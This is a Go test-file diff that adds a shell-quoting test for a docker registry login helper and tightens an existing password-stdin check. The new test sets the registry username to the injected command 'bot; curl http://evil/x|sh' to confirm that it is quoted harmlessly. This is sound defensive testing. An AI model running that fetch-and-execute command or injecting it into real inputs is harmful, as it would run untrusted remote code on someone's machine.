@@ -19,12 +19,30 @@ func TestRegistryLoginRunsWithCreds(t *testing.T) {
 		t.Fatal(err)
 	}
 	all := strings.Join(f.Commands, "\n")
-	if !strings.Contains(all, "docker login registry.gitlab.com") || !strings.Contains(all, "--password-stdin") {
+	if !strings.Contains(all, "docker login 'registry.gitlab.com'") || !strings.Contains(all, "--password-stdin") {
 		t.Fatalf("expected password-stdin login, got:\n%s", all)
 	}
 	// password must not appear as an argument
 	if strings.Contains(all, "-p p") || strings.Contains(all, "--password p") {
 		t.Fatalf("password leaked into argv:\n%s", all)
+	}
+}
+
+func TestRegistryLoginQuotesUserAndServer(t *testing.T) {
+	t.Setenv("DOCKRAIL_REGISTRY_USER", "bot; curl http://evil/x|sh")
+	t.Setenv("DOCKRAIL_REGISTRY_PASSWORD", "p")
+	f := connection.NewFake()
+	var log bytes.Buffer
+	if err := registryLogin(context.Background(), f, config.Registry{Server: "reg host"}, &log); err != nil {
+		t.Fatal(err)
+	}
+	all := strings.Join(f.Commands, "\n")
+	// The metacharacters must be neutralized inside single quotes, not live.
+	if !strings.Contains(all, "--username 'bot; curl http://evil/x|sh'") {
+		t.Fatalf("username not safely quoted:\n%s", all)
+	}
+	if !strings.Contains(all, "docker login 'reg host'") {
+		t.Fatalf("server not safely quoted:\n%s", all)
 	}
 }
 
